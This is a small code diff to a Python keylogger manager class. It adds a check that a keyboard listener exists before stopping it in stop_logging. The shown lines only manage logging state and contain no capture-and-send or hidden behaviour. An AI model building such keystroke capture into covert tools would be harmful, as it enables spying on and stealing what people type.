@@ -20,7 +20,8 @@ class KeyLoggerManager(IKeyLoggerManager):
 
     def stop_logging(self):
         self.__is_logging = False
-        self.listener.stop()
+        if hasattr(self, 'listener'):
+            self.listener.stop()
 
     def __listen(self):
         with Listener(on_press=self.__key_logger.on_press) as self.listener:
